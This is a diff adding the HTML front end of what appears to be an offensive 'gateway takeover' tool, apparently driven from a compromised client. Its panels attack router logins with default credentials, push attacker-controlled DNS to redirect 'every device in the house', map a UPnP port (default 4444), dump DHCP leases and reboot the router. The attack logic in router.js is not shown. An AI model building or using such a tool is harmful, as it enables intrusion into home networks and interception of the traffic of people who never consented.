@@ -1,0 +1,115 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Router</title>
+  <link rel="stylesheet" href="router.css" />
+</head>
+<body>
+  <header class="topbar">
+    <h1>Router</h1>
+    <span class="tag">gateway takeover</span>
+    <span id="statusBadge" class="badge idle">idle</span>
+  </header>
+
+  <main class="layout">
+    <section class="col left">
+      <div class="card">
+        <h2>source client</h2>
+        <label for="clientId">client id</label>
+        <div class="row">
+          <input id="clientId" list="clientsList" placeholder="enter client id" autocomplete="off" />
+          <datalist id="clientsList"></datalist>
+          <button id="refreshClients" class="btn ghost">&#8635;</button>
+        </div>
+        <div id="clientCount" class="hint">no clients seen yet</div>
+      </div>
+
+      <div class="card">
+        <h2>gateway</h2>
+        <label for="gateway">router ip (blank = auto)</label>
+        <input id="gateway" placeholder="auto-detect" />
+        <button id="detect" class="btn primary block">detect router</button>
+        <div id="routerInfo" class="info empty">not detected yet</div>
+      </div>
+
+      <div class="card">
+        <h2>credentials</h2>
+        <label for="users">users (one per line, blank = defaults)</label>
+        <textarea id="users" rows="3" placeholder="admin"></textarea>
+        <label for="passwords">passwords (one per line, blank = defaults)</label>
+        <textarea id="passwords" rows="4" placeholder="admin&#10;password"></textarea>
+        <div class="hint">blank uses the built-in default list (admin/admin, admin/password, root/admin, ...).</div>
+        <button id="attack" class="btn danger block">attack credentials</button>
+      </div>
+
+      <div class="card">
+        <h2>dns control</h2>
+        <label for="dns1">primary dns</label>
+        <input id="dns1" placeholder="your server ip" />
+        <label for="dns2">secondary dns</label>
+        <input id="dns2" placeholder="optional" />
+        <div class="hint">pointing the router's DNS at you redirects every device in the house.</div>
+        <button id="setDns" class="btn block">push dns</button>
+      </div>
+
+      <div class="card">
+        <h2>upnp</h2>
+        <div class="row">
+          <div>
+            <label for="upnpInternalPort">internal port</label>
+            <input id="upnpInternalPort" type="number" value="4444" />
+          </div>
+          <div>
+            <label for="upnpExternalPort">external port</label>
+            <input id="upnpExternalPort" type="number" value="4444" />
+          </div>
+        </div>
+        <label for="upnpInternalIp">internal ip (blank = this host)</label>
+        <input id="upnpInternalIp" placeholder="auto" />
+        <div class="actions">
+          <button id="upnpMap" class="btn">map port</button>
+          <button id="upnpList" class="btn ghost">test igd</button>
+        </div>
+      </div>
+    </section>
+
+    <section class="col right">
+      <div class="card">
+        <h2>admin credentials <span id="credCount" class="count">0</span></h2>
+        <table class="tbl">
+          <thead><tr><th>gateway</th><th>brand</th><th>user</th><th>password</th></tr></thead>
+          <tbody id="credBody"></tbody>
+        </table>
+        <div id="credEmpty" class="empty">no credentials found</div>
+      </div>
+
+      <div class="card">
+        <h2>dhcp leases <span id="leaseCount" class="count">0</span></h2>
+        <table class="tbl">
+          <thead><tr><th>host</th><th>ip</th><th>mac</th></tr></thead>
+          <tbody id="leaseBody"></tbody>
+        </table>
+        <div id="leaseEmpty" class="empty">no leases pulled — run "dump arp" after getting in</div>
+        <button id="dumpArp" class="btn ghost block">dump dhcp leases</button>
+      </div>
+
+      <div class="card">
+        <h2>actions</h2>
+        <div class="actions">
+          <button id="reboot" class="btn">reboot router</button>
+          <button id="factory" class="btn ghost" title="disabled by design">factory reset</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h2>log</h2>
+        <div id="log" class="log"></div>
+      </div>
+    </section>
+  </main>
+
+  <script src="router.js"></script>
+</body>
+</html>
